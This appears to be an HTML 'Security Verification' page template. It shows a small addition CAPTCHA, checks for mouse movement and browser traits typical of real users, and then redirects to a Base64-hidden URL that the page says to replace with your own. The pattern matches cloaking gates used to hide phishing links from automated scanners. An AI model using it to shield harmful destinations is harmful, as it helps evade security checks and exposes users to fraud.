<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Security Check</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
    }
    input, button {
      font-size: 16px;
      padding: 10px;
      margin-top: 10px;
    }
  </style>
  <script>
    // Base64 encoded redirect URL (replace this with your own)
    const encodedUrl = "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ==";

    let num1, num2;
    let mouseMoved = false;
    const startTime = Date.now();

    function isHumanLikeBrowser() {
      return (
        typeof navigator !== 'undefined' &&
        typeof window !== 'undefined' &&
        navigator.userAgent &&
        navigator.userAgent.length > 10 &&
        'language' in navigator &&
        screen.width > 0 &&
        screen.height > 0 &&
        typeof window.DeviceOrientationEvent !== 'undefined'
      );
    }

    function hasMouseMovement() {
      return mouseMoved;
    }

    function generateCaptcha() {
      num1 = Math.floor(Math.random() * 10) + 1;
      num2 = Math.floor(Math.random() * 10) + 1;
      document.getElementById("captcha-question").innerText = `What is ${num1} + ${num2}?`;
    }

    function verifyCaptcha() {
      const userAnswer = parseInt(document.getElementById("captcha-answer").value, 10);
      const elapsed = Date.now() - startTime;

      if (
        isHumanLikeBrowser() &&
        hasMouseMovement() &&
        userAnswer === (num1 + num2) &&
        elapsed > 1500
      ) {
        const decodedUrl = atob(encodedUrl);
        window.location.href = decodedUrl;
      } else {
        alert("Verification failed. Try again.");
        generateCaptcha();
        document.getElementById("captcha-answer").value = "";
      }
    }

    function init() {
      window.addEventListener("mousemove", () => {
        mouseMoved = true;
      });
      generateCaptcha();
    }

    window.onload = init;
  </script>
</head>
<body>
  <h2>Security Verification</h2>
  <p id="captcha-question"></p>
  <input type="number" id="captcha-answer" placeholder="Your answer">
  <br>
  <button onclick="verifyCaptcha()">Verify & Continue</button>
</body>
</html>
